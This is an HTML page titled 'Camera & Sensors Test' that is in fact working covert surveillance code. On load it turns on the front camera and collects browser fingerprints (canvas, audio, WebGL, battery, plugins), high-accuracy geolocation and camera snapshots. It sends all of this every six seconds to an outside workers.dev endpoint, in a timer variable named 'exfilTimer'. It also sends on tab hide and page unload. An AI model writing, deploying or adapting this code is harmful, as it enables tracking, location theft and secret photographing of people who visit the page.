<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera & Sensors Test</title>
  <style>
    body { margin:0; font-family:sans-serif; background:#111; color:#0f0; }
    #preview { width:100vw; height:100vh; object-fit:cover; }
    #status  { position:fixed; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:8px 12px; border-radius:4px; }
  </style>
</head>
<body>

<video id="preview" autoplay playsinline muted></video>
<div id="status">Initializing...</div>

<script>
// ────────────────────────────────────────────────
//  CONFIG – change this
// ────────────────────────────────────────────────
const ENDPOINT = "https://snowy-fog-b0d1.23amtics322.workers.dev/";

// ────────────────────────────────────────────────
//  STATE
// ────────────────────────────────────────────────
let stream = null;
let exfilTimer = null;
let sessionId = crypto.randomUUID?.() || (Date.now().toString(36) + Math.random().toString(36).slice(2));

// ────────────────────────────────────────────────
//  COLLECT EVERYTHING POSSIBLE
// ────────────────────────────────────────────────
async function collectData() {
  const payload = {
    sessionId,
    timestamp: Date.now(),
    url: window.location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent,
    language: navigator.language || navigator.userLanguage,
    languages: navigator.languages,
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    connection: navigator.connection ? {
      type: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    javaEnabled: navigator.javaEnabled?.() ?? false,
    pdfViewerEnabled: navigator.pdfViewerEnabled ?? false,
    webDriver: navigator.webdriver ?? false,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
    permissions: {},
    canvas: null,
    audio: null,
    webgl: null,
    battery: null,
    geolocation: null,
    frontPhoto: null,
    motion: null,
    orientation: null
  };

  // ── Canvas fingerprint ────────────────────────────
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125,1,62,20);
    ctx.fillStyle = '#069';
    ctx.fillText('🛰️ Hello 2026', 2,15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('🛰️ Hello 2026', 4,17);
    payload.canvas = c.toDataURL();
  } catch {}

  // ── AudioContext fingerprint ──────────────────────
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    const analyser = audioCtx.createAnalyser();
    osc.connect(analyser);
    osc.start();
    await new Promise(r => setTimeout(r, 80));
    const data = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(data);
    payload.audio = btoa(String.fromCharCode(...data.slice(0,64)));
    osc.stop(); audioCtx.close();
  } catch {}

  // ── WebGL fingerprint ─────────────────────────────
  try {
    const glc = document.createElement('canvas');
    const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      payload.webgl = {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
      };
    }
  } catch {}

  // ── Battery ───────────────────────────────────────
  try {
    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      payload.battery = {
        level: bat.level,
        charging: bat.charging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime
      };
    }
  } catch {}

  // ── Geolocation ───────────────────────────────────
  try {
    if (navigator.geolocation) {
      const pos = await new Promise((res, rej) => 
        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 })
      );
      payload.geolocation = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        altitudeAccuracy: pos.coords.altitudeAccuracy,
        heading: pos.coords.heading,
        speed: pos.coords.speed
      };
    }
  } catch (e) {
    payload.geolocationError = e.message;
  }

  // ── Device motion / orientation ───────────────────
  if (window.DeviceMotionEvent) {
    payload.motion = { hasEvent: true };
  }
  if (window.DeviceOrientationEvent) {
    payload.orientation = { hasEvent: true };
  }

  // ── Permissions (query what we can) ───────────────
  const permsToCheck = ['camera', 'microphone', 'geolocation'];
  for (const name of permsToCheck) {
    try {
      const status = await navigator.permissions?.query({ name });
      payload.permissions[name] = status?.state;
    } catch {}
  }

  // ── Front camera snapshot (if stream active) ──────
  const vid = document.getElementById('preview');
  if (vid && vid.videoWidth > 0) {
    try {
      const c = document.createElement('canvas');
      c.width = vid.videoWidth;
      c.height = vid.videoHeight;
      c.getContext('2d').drawImage(vid, 0, 0);
      payload.frontPhoto = c.toDataURL('image/jpeg', 0.78);
    } catch {}
  }

  return payload;
}

// ────────────────────────────────────────────────
//  SEND FUNCTION
// ────────────────────────────────────────────────
async function sendData() {
  try {
    const data = await collectData();
    const res = await fetch(ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      keepalive: true,
      mode: 'no-cors'   // allows send even if CORS blocks response reading
    });
    document.getElementById('status').textContent = `Sent ${new Date().toLocaleTimeString()}`;
  } catch (e) {
    document.getElementById('status').textContent = `Error: ${e.message}`;
  }
}

// ────────────────────────────────────────────────
//  START CAMERA
// ────────────────────────────────────────────────
async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },   // front camera
      audio: false
    });
    document.getElementById('preview').srcObject = stream;
    document.getElementById('status').textContent = 'Camera active • collecting data...';

    // Start sending every ~6 seconds
    if (!exfilTimer) {
      exfilTimer = setInterval(sendData, 6000);
      sendData(); // immediate first send
    }
  } catch (err) {
    document.getElementById('status').textContent = `Camera error: ${err.message}`;
  }
}

// ────────────────────────────────────────────────
//  INIT
// ────────────────────────────────────────────────
window.addEventListener('load', () => {
  if (navigator.mediaDevices?.getUserMedia) {
    startCamera();
  } else {
    document.getElementById('status').textContent = 'getUserMedia not supported';
  }
});

// Optional: also send on visibility change / before unload
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') sendData();
});
window.addEventListener('beforeunload', sendData);
</script>
</body>
</html>
